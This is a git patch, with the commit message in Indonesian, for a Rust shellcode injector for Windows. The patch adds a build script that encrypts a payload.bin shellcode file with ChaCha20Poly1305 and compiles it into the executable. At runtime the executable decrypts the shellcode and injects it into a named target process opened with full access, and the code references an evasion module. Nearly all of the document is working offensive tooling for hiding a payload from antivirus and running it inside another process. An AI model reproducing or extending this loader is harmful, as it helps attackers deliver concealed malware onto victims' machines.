@@ -1,0 +1,172 @@
+From 51611b58ec8d30cc0474712e0ea7985eabac5ee6 Mon Sep 17 00:00:00 2001
+From: Ron Panduwana <panduwana@gmail.com>
+Date: Mon, 19 Oct 2026 13:50:03 +0700
+Subject: [PATCH 02/10] make inject works like furtim: - ketika inject
+ dicompile, akan menginclude payload.bin (hasil dari menjalankan
+ generate_shellcode.exe) - sehingga payload.bin akan menyatu dengan/ada di
+ dalam inject.exe - payloadnya akan diencrypt menggunakan algoritma chacha -
+ ketika inject.exe dijalankan, payload tidak diambil dari file terpisah, tapi
+ dari payload yg ada di dalam inject.exe itu sendiri - payload tsb kemudian
+ akan didecrypt sebelum berlanjut ke langkah inject
+
+---
+ inject/Cargo.toml    |  6 ++++
+ inject/build.rs      | 65 ++++++++++++++++++++++++++++++++++++++++++++
+ inject/src/crypto.rs |  3 +-
+ inject/src/main.rs   | 14 +++++-----
+ 4 files changed, 80 insertions(+), 8 deletions(-)
+ create mode 100644 inject/build.rs
+
+diff --git a/inject/Cargo.toml b/inject/Cargo.toml
+index 9bd0183..ab0294b 100644
+--- a/inject/Cargo.toml
++++ b/inject/Cargo.toml
+@@ -14,6 +14,12 @@ sysinfo = "0.29"
+ chacha20poly1305 = "0.10.1"
+ base64 = "0.22.1"
+ 
++[build-dependencies]
++chacha20poly1305 = "0.10.1"
++rand = "0.8.5"
++rand_core = "0.6.4"
++base64 = { version = "0.22.1", features = ["std"] }
++
+ [dependencies.windows-sys]
+ version = "0.52.0"
+ features = [
+diff --git a/inject/build.rs b/inject/build.rs
+new file mode 100644
+index 0000000..7ffab94
+--- /dev/null
++++ b/inject/build.rs
+@@ -0,0 +1,65 @@
++use chacha20poly1305::{
++    aead::{Aead, KeyInit}, 
++    ChaCha20Poly1305, Key, Nonce, 
++};
++use rand::RngCore; 
++use rand::rngs::OsRng; 
++use std::env; 
++use std::fs; 
++use std::io::Write; 
++use std::path::Path; 
++
++use base64::engine::Engine as _; 
++use base64::engine::general_purpose::STANDARD; 
++
++fn main() {
++    println!("cargo:warning=--- Injector BUILD.RS STARTED ---"); 
++    
++    let payload_path = Path::new("payload.bin"); 
++    
++    // Create dummy payload if it doesn't exist to allow compilation
++    if !payload_path.exists() {
++        println!("cargo:warning=payload.bin not found, creating dummy.");
++        fs::write(payload_path, b"\x90\x90\x90\x90").unwrap(); // NOPs
++    }
++    
++    println!("cargo:rerun-if-changed={}", payload_path.display()); 
++
++    let shellcode = fs::read(payload_path)
++        .expect("Error: payload.bin could not be read.");
++        
++    println!("cargo:warning=Shellcode read successfully, size: {} bytes", shellcode.len()); 
++    
++    let mut rng = OsRng::default();
++
++    let mut key_bytes = [0u8; 32];
++    RngCore::fill_bytes(&mut rng, &mut key_bytes); 
++    let key = Key::from_slice(&key_bytes); 
++
++    let mut nonce_bytes = [0u8; 12];
++    RngCore::fill_bytes(&mut rng, &mut nonce_bytes); 
++    let nonce = Nonce::from_slice(&nonce_bytes);
++
++    let cipher = ChaCha20Poly1305::new(key); 
++    let ciphertext_vec = cipher 
++        .encrypt(nonce, shellcode.as_ref())
++        .expect("Payload encryption failed!");
++
++    let ciphertext_base64 = STANDARD.encode(ciphertext_vec); 
++    
++    let out_dir = env::var("OUT_DIR").unwrap();
++    let dest_path = Path::new(&out_dir).join("payload_data.rs"); 
++
++    let mut file = fs::File::create(&dest_path).expect("Could not create payload_data.rs file");
++    
++    writeln!(
++        file,
++        "pub const ENCRYPTED_PAYLOAD_BASE64: &str = \"{}\";", 
++        ciphertext_base64
++    ).unwrap(); 
++    writeln!(file, "pub const PAYLOAD_KEY: [u8; 32] = {:?};", key_bytes).unwrap();
++    writeln!(file, "pub const PAYLOAD_NONCE: [u8; 12] = {:?};", nonce_bytes).unwrap();
++    
++    println!("cargo:warning=--- Injector: Shellcode successfully encrypted in {}", dest_path.display());
++    println!("cargo:warning=--- Injector BUILD.RS FINISHED ---");
++}
+diff --git a/inject/src/crypto.rs b/inject/src/crypto.rs
+index df57b58..94386ad 100644
+--- a/inject/src/crypto.rs
++++ b/inject/src/crypto.rs
+@@ -1,4 +1,5 @@
+-use chacha20poly1305::{Aead, ChaCha20Poly1305, Key, KeyInit, Nonce};
++use chacha20poly1305::{ChaCha20Poly1305, Key, KeyInit, Nonce};
++use chacha20poly1305::aead::Aead;
+ use base64::engine::{Engine as _, general_purpose::STANDARD};
+ 
+ pub fn decrypt_payload(ciphertext_base64: &str, key_bytes: &[u8; 32], nonce_bytes: &[u8; 12]) -> Result<Vec<u8>, String> {
+diff --git a/inject/src/main.rs b/inject/src/main.rs
+index b7d7f0d..578e29a 100644
+--- a/inject/src/main.rs
++++ b/inject/src/main.rs
+@@ -1,6 +1,7 @@
+ use std::{ptr::null_mut, mem::size_of, process};
+ use clap::Parser;
+ mod evasion;
++mod crypto;
+ use windows_sys::Win32::{
+     Foundation::{CloseHandle, INVALID_HANDLE_VALUE},
+     System::{
+@@ -10,6 +11,8 @@ use windows_sys::Win32::{
+     },
+ };
+ 
++include!(concat!(env!("OUT_DIR"), "/payload_data.rs"));
++
+ /// Simple Injector for PoC
+ #[derive(Parser, Debug)]
+ #[command(author, version, about, long_about = None)]
+@@ -17,10 +20,6 @@ struct Args {
+     /// The target process name (notepad.exe)
+     #[arg(long)]
+     process: String,
+-
+-    /// The PIC file path (shellcode.bin)
+-    #[arg(long)]
+-    file: String,
+ }
+ 
+ fn main() {
+@@ -29,14 +28,15 @@ fn main() {
+     }
+ 
+     let args = Args::parse();
+-
+     let process_name = &args.process;
+-    let file_path = args.file;
+ 
+     let process_id = get_process_id_by_name(process_name).expect("Failed to get process ID by name");
+     println!("[+] Process ID: {}", process_id);
+ 
+-    let shellcode_bytes = std::fs::read(file_path).expect("Failed to read path to PIC shellcode");
++    let shellcode_bytes = crypto::decrypt_payload(ENCRYPTED_PAYLOAD_BASE64, &PAYLOAD_KEY, &PAYLOAD_NONCE)
++        .expect("Failed to decrypt payload");
++    
++    println!("[+] Shellcode decrypted, size: {} bytes", shellcode_bytes.len());
+ 
+     // Get a handle to the target process with PROCESS_ALL_ACCESS
+     let process_handle = unsafe { OpenProcess(PROCESS_ALL_ACCESS, 0, process_id) };
+-- 
+2.39.5 (Apple Git-154)
+
